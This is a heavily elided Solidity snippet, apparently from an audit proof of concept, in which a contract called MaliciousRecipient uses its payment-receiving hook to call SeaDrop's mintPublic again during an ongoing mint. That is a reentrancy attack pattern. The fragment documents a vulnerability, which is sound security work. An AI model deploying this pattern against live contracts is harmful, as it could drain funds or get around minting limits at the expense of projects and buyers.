...
contract MaliciousRecipient {
    ...
    receive() external payable {
        if (startAttack) {
            ...
            seaDrop.mintPublic{value: 1 ether}({
                nftContract: token, feeRecipient: address(this), minterIfNotPayer: address(this), quantity: 1
            });
        }
    }
    ...
    function attack(SeaDrop _seaDrop, address _token) external payable {
        ...
        _seaDrop.mintPublic{value: 1 ether}({
            nftContract: _token, feeRecipient: address(this), minterIfNotPayer: address(this), quantity: 1
        });
